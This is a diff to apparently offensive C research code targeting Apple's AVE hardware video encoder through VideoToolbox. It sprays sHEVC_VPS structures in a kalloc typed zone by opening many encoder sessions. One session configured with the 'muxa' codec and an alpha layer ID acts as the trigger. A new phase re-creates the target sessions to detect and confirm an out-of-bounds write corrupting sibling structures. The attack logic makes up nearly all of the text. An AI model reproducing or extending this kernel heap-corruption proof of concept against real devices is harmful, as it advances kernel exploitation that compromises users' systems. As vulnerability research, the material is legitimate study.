@@ -7900,23 +7900,29 @@ vps_cd_done:
         VTCompressionSessionRef *sessions = calloc(sess_count, sizeof(VTCompressionSessionRef));
         if (!sessions) { rlog("FAIL: calloc\n"); goto done; }
 
-        /* Phase 1: Create many AVE sessions to spray sHEVC_VPS structs */
+        /* Phase 1: Create AVE sessions — sess[0] uses muxa+alpha (trigger),
+           rest use standard HEVC (targets with real output for comparison).
+           Both codec paths allocate sHEVC_VPS in the same kalloc typed zone. */
         rlog("--- Phase 1: Create %d AVE encoder sessions ---\n", sess_count);
+        rlog("  sess[0]: muxa+alpha (trigger), sess[1..%d]: HEVC (targets)\n", sess_count-1);
         int sess_ok = 0;
         for (int i = 0; i < sess_count; i++) {
             CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
                 &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
             CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CMVideoCodecType codec = (i == 0) ? (CMVideoCodecType)0x6D757861 : kCMVideoCodecType_HEVC;
             OSStatus s = VTCompressionSessionCreate(NULL, 192, 192,
-                (CMVideoCodecType)0x6D757861, es, NULL, NULL, encode_cb, NULL, &sessions[i]);
+                codec, es, NULL, NULL, encode_cb, NULL, &sessions[i]);
             CFRelease(es);
             if (s == noErr && sessions[i]) {
                 VTSessionSetProperty(sessions[i], kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
-                VTSessionSetProperty(sessions[i], CFSTR("EncodesAlpha"), kCFBooleanTrue);
-                int aid = 128;
-                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
-                VTSessionSetProperty(sessions[i], CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
-                CFRelease(aidn);
+                if (i == 0) {
+                    VTSessionSetProperty(sessions[i], CFSTR("EncodesAlpha"), kCFBooleanTrue);
+                    int aid = 128;
+                    CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+                    VTSessionSetProperty(sessions[i], CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                    CFRelease(aidn);
+                }
                 s = VTCompressionSessionPrepareToEncodeFrames(sessions[i]);
                 if (s == noErr) sess_ok++;
                 else rlog("  sess[%d] prepare failed: %d\n", i, (int)s);
@@ -8045,9 +8051,41 @@ vps_cd_done:
                 }
             }
         }
-        rlog("\nResults: %d / %d target sessions showed changes\n",
+        rlog("\nPhase 4 results: %d / %d target sessions showed output changes\n",
             corrupted_sess, sess_ok - 1);
-        if (corrupted_sess > 0)
+
+        /* Phase 5: Additional detection — check if corrupted VPS causes crash or
+           error when re-preparing sessions */
+        rlog("\n--- Phase 5: Re-prepare target sessions (crash = corruption) ---\n");
+        int reprep_changed = 0;
+        for (int i = 1; i < sess_count; i++) {
+            if (!sessions[i]) continue;
+            VTCompressionSessionInvalidate(sessions[i]);
+            CFRelease(sessions[i]);
+            sessions[i] = NULL;
+            CFMutableDictionaryRef es2 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es2, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus s2 = VTCompressionSessionCreate(NULL, 192, 192,
+                kCMVideoCodecType_HEVC, es2, NULL, NULL, encode_cb, NULL, &sessions[i]);
+            CFRelease(es2);
+            if (s2 != noErr) {
+                rlog("  sess[%d] re-create failed: %d (unexpected!)\n", i, (int)s2);
+                reprep_changed++;
+            } else if (sessions[i]) {
+                VTSessionSetProperty(sessions[i], kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                s2 = VTCompressionSessionPrepareToEncodeFrames(sessions[i]);
+                if (s2 != noErr) {
+                    rlog("  sess[%d] re-prepare failed: %d\n", i, (int)s2);
+                    reprep_changed++;
+                }
+            }
+        }
+        rlog("Re-prepare: %d sessions had issues\n", reprep_changed);
+
+        rlog("\nTotal corruption indicators: output=%d reprep=%d\n",
+            corrupted_sess, reprep_changed);
+        if (corrupted_sess > 0 || reprep_changed > 0)
             rlog("*** SAME-TYPE ZONE OOB CONFIRMED — sibling sHEVC_VPS corrupted ***\n");
         else
             rlog("No observable corruption (OOB may have landed in zone padding)\n");
